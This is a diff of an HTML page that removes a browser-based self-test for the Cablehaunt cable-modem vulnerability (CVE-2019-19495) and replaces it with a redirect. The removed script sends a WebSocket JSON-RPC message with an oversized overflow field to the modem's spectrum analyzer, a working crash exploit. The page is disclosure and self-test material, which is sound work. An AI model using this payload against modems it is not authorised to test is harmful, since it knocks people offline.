@@ -1,35 +1,11 @@
 <!DOCTYPE html>
+<!-- Redirect to non-HTTPs hosting (required for non-SSL websockets) -->
 <html>
   <head>
-    <title>Cablehaunt check &#x1F50C;&#x1F47B;</title>
+    <title>Redirecting...</title>
+    <meta http-equiv="refresh" content="0;URL='http://kria.dcoles.net/cablehaunt/'">
   </head>
   <body>
-    <h1>Cablehaunt check &#x1F50C;&#x1F47B;</h1>
-    <p>Try to crash modem using Cablehaunt vulnerability
-    (<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-19495">CVE-2019-19495</a>).</p>
-    <p><strong>NOTE:</strong> This particular test *only* works on modems running the vulnerable
-    <a href="http://192.168.100.1:8080/">Spectrum Analyzer on port 8080</a> with
-    no authentication (e.g. the
-    <a href="https://www.arris.com/surfboard/products/cable-modems/sb6183/">ARRIS SB6183</a>),
-    but many other Broadcom-based modems are vulnerable to the same attack with
-    minor modification.</p>
-    <p><button type="button" onclick="run()">Test</button> <span style="color:
-    red"><strong>WARNING:</strong> This may crash your cable modem!</span></p>
-    <p>For further details see <a href="https://cablehaunt.com/">cablehaunt.com</a>.</p>
-    <p style="font-size: small">David Coles (<a href="https://twitter.com/davidcoles">@davidcoles</a>)</p>
-
-    <script>
-      function run() {
-        if (confirm('WARNING: This may crash your cable modem!\n\nAre you sure you wish to continue?')) {
-          const socket = new WebSocket('ws://192.168.100.1:8080/Frontend', 'rpc-frontend');
-
-          // Connection opened
-          socket.addEventListener('open', function (event) {
-            console.log('Sending exploit');
-            socket.send('{"jsonrpc":"2.0","method":"Frontend::GetFrontendSpectrumData","params":{"coreID":0,"fStartHz":AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,"fftSize":1024,"gain":1,"numOfSamples":1},"id":"0"}');
-          });
-        }
-      }
-    </script>
+    Redirecting to <a href="http://kria.dcoles.net/cablehaunt/">http://kria.dcoles.net/cablehaunt/</a>...
   </body>
 </html>
